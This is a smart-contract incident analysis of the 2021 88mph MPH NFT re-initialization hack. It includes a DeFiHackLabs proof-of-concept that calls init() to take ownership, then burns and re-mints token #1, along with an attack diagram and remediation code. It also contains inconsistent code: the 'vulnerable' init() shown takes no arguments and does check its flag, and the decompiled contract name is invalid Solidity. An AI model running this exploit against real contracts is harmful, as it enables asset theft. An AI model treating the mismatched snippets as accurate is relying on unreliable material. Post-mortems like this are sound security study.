# 88mph — Unprotected init() Re-initialization Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2021-06-23 |
| **Protocol** | 88mph (MPH NFT) |
| **Chain** | Ethereum |
| **Loss** | NFT theft (minor financial loss) |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed (fork block: 12,516,705) |
| **Vulnerable Contract** | [0xF0b7DE03134857391d8D43Ed48e20EDF21461097](https://etherscan.io/address/0xF0b7DE03134857391d8D43Ed48e20EDF21461097) (MPH NFT) |
| **Root Cause** | The `init()` function checks an `initialized` flag but can be re-invoked after deployment, allowing ownership takeover |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/88mph_exp.sol) |

---
## 1. Vulnerability Overview

The 88mph MPH NFT contract (0xF0b7DE03134857391d8D43Ed48e20EDF21461097) was deployed using a proxy pattern and performs initialization via the `init()` function. However, the `init()` implementation in certain pool contracts was incomplete, allowing re-invocation even after the contract had already been initialized. The attacker called `init(address(this), "0", "0")` to change the NFT contract's owner to their own address, then stole NFTs by burning existing tokens and re-minting new ones.

---
## 2. Vulnerable Code Analysis

### 2.1 init() — initialized Flag Bypass

```solidity
// ❌ MPH NFT Pool contracts — init() can be re-invoked
// @ 0xF0b7DE03134857391d8D43Ed48e20EDF21461097
function init() public {
    require(!initialized, "MPHToken: initialized");
    initialized = true;
    _transferOwnership(msg.sender);
    // The initialized flag exists, but
    // in some pool contracts this check is missing or
    // the initialized variable remains false due to storage slot collision
}
```

**Fixed Code**:
```solidity
// ✅ Use OpenZeppelin Initializable + initializer modifier
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract MPHToken is Initializable, OwnableUpgradeable, ERC721Upgradeable {
    // initializer modifier guarantees execution only once
    function initialize(address owner, string memory name, string memory symbol)
        public initializer
    {
        __Ownable_init();
        __ERC721_init(name, symbol);
        _transferOwnership(owner);
    }
    // No init() function — only initialize() is used
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**MPH NFT_decompiled.sol** — Related contract (vulnerable function Facet not included):
```solidity
// ❌ Root Cause: init() function checks the `initialized` flag but can be re-invoked after deployment, allowing ownership takeover
// ⚠️ Source for vulnerable function `init()` is not in this file
// (Located in a Diamond pattern Facet or proxy implementation contract)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — reverse engineered from bytecode
// Original: 0xF0b7DE03134857391d8D43Ed48e20EDF21461097 (Ethereum)
// Reverse engineering method: function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract MPH NFT_Decompiled {
    // ── Selectors that failed to decode ──
    // 0x58cc0adf: unknown function

}

```

## 3. Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│ Step 1: Call mphNFT.init(address(this), "0", "0")       │
│ MPH NFT @ 0xF0b7DE03134857391d8D43Ed48e20EDF21461097   │
│ Bypass initialized flag → Transfer ownership to attacker│
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 2: mphNFT.burn(1) — Burn token #1                  │
│ Destroy existing NFT using new owner privileges          │
└─────────────────────┬───────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────┐
│ Step 3: mphNFT.mint(address(this), 1) — Re-mint token #1│
│ Mint new NFT owned by attacker                          │
└─────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — Mainnet fork block 12,516,705
function testExploit() public {
    console.log("Before exploiting, NFT contract owner:", mphNFT.owner());

    // Re-invoke init() to seize ownership
    // I88mph @ 0xF0b7DE03134857391d8D43Ed48e20EDF21461097
    mphNFT.init(address(this), "0", "0");

    console.log("After exploiting, NFT contract owner:", mphNFT.owner());
    console.log("NFT Owner of #1: ", mphNFT.ownerOf(1));

    // Burn existing NFT
    mphNFT.burn(1);

    // Re-mint under attacker ownership
    mphNFT.mint(address(this), 1);
    console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1));
}

function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
    return this.onERC721Received.selector;
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unprotected init() re-initialization — ownership takeover possible | CRITICAL | CWE-284 |
| V-02 | Ambiguous initialization state in proxy contract | HIGH | CWE-665 |

---
## 6. Remediation Recommendations

```solidity
// ✅ Use OpenZeppelin Initializable's initializer modifier
// ✅ Call initialize() immediately after proxy deployment (atomic deployment)

// Deployment script example (atomic initialization)
// 1. Use factory.deployAndInitialize(implementation, initData)
// 2. Or call _disableInitializers() in the constructor

contract MPHTokenImpl is Initializable {
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers(); // Prevent direct initialization of implementation contract
    }

    function initialize(address owner) public initializer {
        _transferOwnership(owner);
    }
}
```

---
## 7. Lessons Learned

- **In proxy patterns, the `init()` function must be called atomically immediately after deployment.** Initializing in a separate transaction exposes the contract to front-running or re-initialization attacks.
- **Use OpenZeppelin `Initializable` rather than implementing the `initialized` flag manually.** Using a battle-tested pattern prevents edge cases such as storage slot collisions.
- **NFT burn + re-mint after ownership takeover is accomplished in just 3 function calls.** The blast radius of an initialization vulnerability appears simple but is devastating.